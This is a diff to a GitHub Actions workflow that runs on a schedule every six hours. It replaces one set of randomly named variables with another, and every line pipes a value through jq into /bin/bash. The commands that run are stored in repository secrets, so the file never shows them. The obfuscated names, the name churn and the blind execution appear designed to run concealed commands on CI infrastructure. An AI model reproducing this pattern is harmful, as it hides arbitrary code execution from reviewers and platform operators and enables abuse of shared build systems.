@@ -2,33 +2,29 @@ name: weiyuanwang4893
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 4/6 * * *'
-
+    - cron: '32 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: weiyuanwang4893
         env:
-          wbzai54: ${{ secrets.wbzai54 }}
+          wx9573: ${{ secrets.wx9573 }}
         run: |
-          echo $wbzai54 | jq -r .j943 | /bin/bash
-          echo $z38 | jq -r .zcpw7 | /bin/bash
-          echo $sqqtg45 | jq -r .n218 | /bin/bash
-          echo $sn39 | jq -r .dj1 | /bin/bash
-          echo $u1311 | jq -r .vvn825 | /bin/bash
-          echo $evaz6 | jq -r .r78 | /bin/bash
-          echo $rbwo5 | jq -r .adhz86 | /bin/bash
-          echo $tkmp82 | jq -r .wjx459 | /bin/bash
-          echo $repj1 | jq -r .y89844 | /bin/bash
-          echo $g52091 | jq -r .b09083 | /bin/bash
-          echo $jem33652 | jq -r .gjdbu03894 | /bin/bash
-          echo $rsq95 | jq -r .mdygb8 | /bin/bash
-          echo $cf758 | jq -r .yc5408 | /bin/bash
-          echo $nir48 | jq -r .gzqg04651 | /bin/bash
-          echo $nbb96627 | jq -r .wqwus12611 | /bin/bash
-          echo $a53956 | jq -r .t141 | /bin/bash
-          echo $en01 | jq -r .cqem8 | /bin/bash
+          echo $wx9573 | jq -r .cse8257 | /bin/bash
+          echo $duvky456 | jq -r .gb97 | /bin/bash
+          echo $nxg8 | jq -r .jrq4247 | /bin/bash
+          echo $uzb56 | jq -r .pytgc61 | /bin/bash
+          echo $by82 | jq -r .rwoo8523 | /bin/bash
+          echo $txy3 | jq -r .gg4 | /bin/bash
+          echo $yn0736 | jq -r .zl2318 | /bin/bash
+          echo $uy24711 | jq -r .qt6545 | /bin/bash
+          echo $ez1948 | jq -r .gvits288 | /bin/bash
+          echo $xzhhc89 | jq -r .zv03858 | /bin/bash
+          echo $z18755 | jq -r .lbzfa7017 | /bin/bash
+          echo $g7 | jq -r .uafsb01286 | /bin/bash
+          echo $g4814 | jq -r .qtamp26 | /bin/bash
+          echo $s021 | jq -r .lpq005 | /bin/bash
+          echo $b9614 | jq -r .zsc39 | /bin/bash
 
